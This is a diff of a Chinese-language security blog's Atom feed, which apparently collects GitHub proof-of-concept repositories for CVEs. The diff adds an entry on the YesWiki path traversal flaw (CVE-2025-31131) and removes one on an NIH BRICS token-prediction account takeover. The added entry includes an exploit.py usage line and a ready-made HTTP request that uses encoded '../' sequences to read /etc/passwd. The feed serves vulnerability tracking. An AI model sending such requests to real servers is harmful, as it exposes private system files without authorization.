@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-07T09:08:24.548Z</updated>
+  <updated>2025-06-07T09:45:13.679Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,37 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>YesWiki 路径遍历漏洞</title>
+    <link href="http://example.com/2025/06/07/github_92314985/"/>
+    <id>http://example.com/2025/06/07/github_92314985/</id>
+    <published>2025-06-07T09:45:13.683Z</published>
+    <updated>2025-06-07T09:45:13.679Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>漏洞名称：</strong> YesWiki 路径遍历漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-31131</li></ul><p><strong>漏洞类型：</strong> 目录遍历</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> YesWiki是一个用PHP编写的wiki系统。squelette参数存在路径遍历漏洞，允许攻击者读取服务器上的任意文件。此漏洞在4.5.2版本中已修复。</p><p><strong>产品厂商：</strong> YesWiki</p><p><strong>产品名称：</strong> YesWiki</p><p><strong>影响版本：</strong> &lt; 4.5.2</p><p><strong>来源：</strong> <a href="https://github.com/B1ack4sh/Blackash-CVE-2025-31131">https://github.com/B1ack4sh/Blackash-CVE-2025-31131</a></p><p><strong>类型：</strong> CVE-2025:github search</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-comment"># Blackash-CVE-2025-31131</span><br><br>CVE-<span class="hljs-number">202</span>5-<span class="hljs-number">31131</span> <span class="hljs-operator">-</span> YesWiki <span class="hljs-operator">&lt;</span> <span class="hljs-number">4.5</span>.<span class="hljs-number">2</span> Path Traversal Exploit<br><br><br><span class="hljs-comment">## Description</span><br>YesWiki is a wiki system written <span class="hljs-keyword">in</span> PHP. The squelette parameter is vulnerable to path traversal attacks, enabling read access to arbitrary files on the server. This vulnerability is fixed <span class="hljs-keyword">in</span> <span class="hljs-number">4.5</span>.<span class="hljs-number">2</span>.<br><br><span class="hljs-params">NIST:</span> \`NVD\` Base <span class="hljs-params">Score:</span> <span class="hljs-number">7.5</span> 🔴 HIGH <span class="hljs-params">Vector:</span>  CVSS:<span class="hljs-number">3.1</span><span class="hljs-operator">/</span>AV:N<span class="hljs-operator">/</span>AC:L<span class="hljs-operator">/</span>PR:N<span class="hljs-operator">/</span>UI:N<span class="hljs-operator">/</span>S:U<span class="hljs-operator">/</span>C:H<span class="hljs-operator">/</span>I:N<span class="hljs-operator">/</span>A:N<br><span class="hljs-params">CNA:</span>  \`GitHub, Inc\` Base <span class="hljs-params">Score:</span> <span class="hljs-number">8.6</span> 🔴 HIGH <span class="hljs-params">Vector:</span>  CVSS:<span class="hljs-number">3.1</span><span class="hljs-operator">/</span>AV:N<span class="hljs-operator">/</span>AC:L<span class="hljs-operator">/</span>PR:N<span class="hljs-operator">/</span>UI:N<span class="hljs-operator">/</span>S:C<span class="hljs-operator">/</span>C:H<span class="hljs-operator">/</span>I:N<span class="hljs-operator">/</span>A:N<br><br><br><br><span class="hljs-comment"># Usage</span><br><br>\`\`\`<br>┌──(kali㉿kali)-[~]<br>└─$ sudo python3 exploit.py <span class="hljs-operator">-</span>u https:<span class="hljs-operator">//</span>example.com<span class="hljs-symbol">/</span><br>\`\`\`<br><br>Here is a second method to exploit manually using <span class="hljs-params">Burp:</span><br><br>\`\`\`<br>GET <span class="hljs-operator">/</span><span class="hljs-operator">?</span>UrkCEO<span class="hljs-operator">/</span>edit&amp;theme<span class="hljs-operator">=</span>margot&amp;squelette<span class="hljs-operator">=</span>..%<span class="hljs-number">2</span>f..%<span class="hljs-number">2</span>f..%<span class="hljs-number">2</span>f..%<span class="hljs-number">2</span>f..%<span class="hljs-number">2</span>f..%<span class="hljs-number">2</span>f..%<span class="hljs-number">2</span>f..%<span class="hljs-number">2</span>fetc%<span class="hljs-number">2</span>fpasswd&amp;style<span class="hljs-operator">=</span>margot.css HTTP<span class="hljs-symbol">/1.1</span><br><span class="hljs-params">Host:</span> target.com<br><span class="hljs-params">Sec-Ch-Ua:</span> <span class="hljs-string">&quot;Chromium&quot;</span>;<span class="hljs-attr">v</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;133&quot;</span>, <span class="hljs-string">&quot;Not(A:Brand&quot;</span>;<span class="hljs-attr">v</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;99&quot;</span><br><span class="hljs-params">Sec-Ch-Ua-Mobile:</span> <span class="hljs-operator">?</span><span class="hljs-number">0</span><br><span class="hljs-params">Sec-Ch-Ua-Platform:</span> <span class="hljs-string">&quot;Windows&quot;</span><br><span class="hljs-params">Accept-Language:</span> en-US,en;<span class="hljs-attr">q</span><span class="hljs-operator">=</span><span class="hljs-number">0.9</span><br><span class="hljs-params">Upgrade-Insecure-Requests:</span> <span class="hljs-number">1</span><br><span class="hljs-params">User-Agent:</span> Mozilla<span class="hljs-symbol">/5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit<span class="hljs-symbol">/537.36</span> (KHTML, like Gecko) Chrome<span class="hljs-symbol">/133.0.0.0</span> Safari<span class="hljs-symbol">/537.36</span><br><span class="hljs-params">Accept:</span> text<span class="hljs-operator">/</span>html,application<span class="hljs-operator">/</span>xhtml<span class="hljs-operator">+</span>xml,application<span class="hljs-symbol">/xml</span>;<span class="hljs-attr">q</span><span class="hljs-operator">=</span><span class="hljs-number">0.9</span>,image<span class="hljs-operator">/</span>avif,image<span class="hljs-operator">/</span>webp,image<span class="hljs-operator">/</span>apng,<span class="hljs-operator">*</span><span class="hljs-comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="hljs-comment">Sec-Fetch-Site: none</span><br><span class="hljs-comment">Sec-Fetch-Mode: navigate</span><br><span class="hljs-comment">Sec-Fetch-User: ?1</span><br><span class="hljs-comment">Sec-Fetch-Dest: document</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate, br</span><br><span class="hljs-comment">Priority: u=0, i</span><br><span class="hljs-comment">Connection: keep-alive</span><br><span class="hljs-comment">\`\`\`</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">## Disclaimer !!!</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">This is strictly for educational purposes only.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br></code></pre></td></tr></table></figure><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><br><br><span class="hljs-bullet">- </span>README.md<br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; YesWiki 路径遍历漏洞&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;CVE：&lt;/strong&gt; CVE-2025-31131&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;stro</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
+    
+    <category term="目录遍历" scheme="http://example.com/tags/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/"/>
+    
+  </entry>
   
   <entry>
     <title>【已复现】Dataease JWT 认证绕过漏洞/远程代码执行（CVE-2025-49001/CVE-2025-49002）</title>
@@ -550,37 +581,6 @@
     
     
     <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
-    
-    <category term="权限提升" scheme="http://example.com/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>NIH BRICS 权限提升漏洞</title>
-    <link href="http://example.com/2025/06/06/github_3632516539/"/>
-    <id>http://example.com/2025/06/06/github_3632516539/</id>
-    <published>2025-06-06T14:30:20.070Z</published>
-    <updated>2025-06-06T14:30:20.069Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>漏洞名称：</strong> NIH BRICS 权限提升漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-27580</li></ul><p><strong>漏洞类型：</strong> 权限提升</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> NIH BRICS（又名生物医学研究信息计算系统）至14.0.0-67版本存在一个可预测令牌漏洞，该漏洞依赖于用户名、时间和固定的7Dl9#dj-字符串。这使得拥有普通访问卡（CAC）的未认证用户能够提升权限并危害任何账户，包括管理员账户。</p><p><strong>产品厂商：</strong> NIH</p><p><strong>产品名称：</strong> BRICS (Biomedical Research Informatics Computing System)</p><p><strong>影响版本：</strong> version &lt;&#x3D; 14.0.0-67</p><p><strong>来源：</strong> <a href="https://github.com/TrustStackSecurity/CVE-2025-27580">https://github.com/TrustStackSecurity/CVE-2025-27580</a></p><p><strong>类型：</strong> CVE-2025:github search</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs perl"><br><span class="hljs-comment"># CVE-2025-27580: Unauthenticated Account Takeover in NIH BRICS</span><br><br>NIH BRICS (aka Biomedical Research Informatics Computing System) through <span class="hljs-number">14.0</span>.<span class="hljs-number">0</span>-<span class="hljs-number">67</span> generates predictable tokens (that depend on username, <span class="hljs-keyword">time</span>, <span class="hljs-keyword">and</span> the fixed 7Dl9<span class="hljs-comment">#dj- string) and thus allows unauthenticated users with a Common Access Card (CAC) to escalate privileges and compromise any account, including administrators.</span><br><br>Published a <span class="hljs-keyword">write</span>-up: https:<span class="hljs-regexp">//</span>bugculture.io/CVE-<span class="hljs-number">2025</span>-<span class="hljs-number">27580</span>/<br><br>Discovered by Chandler Rose (Founder/Security Consultant), February <span class="hljs-number">2025</span>.<br><br>References:<br><br>- https:<span class="hljs-regexp">//</span>www.cve.org/CVERecord?id=CVE-<span class="hljs-number">2025</span>-<span class="hljs-number">27580</span><br><br><br><br></code></pre></td></tr></table></figure><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><br><br><span class="hljs-bullet">- </span>README.md<br><span class="hljs-bullet">- </span>exploit.py<br><br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; NIH BRICS 权限提升漏洞&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/strong&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;CVE：&lt;/strong&gt; CVE-2025-27580&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;st</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
     
     <category term="权限提升" scheme="http://example.com/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
     
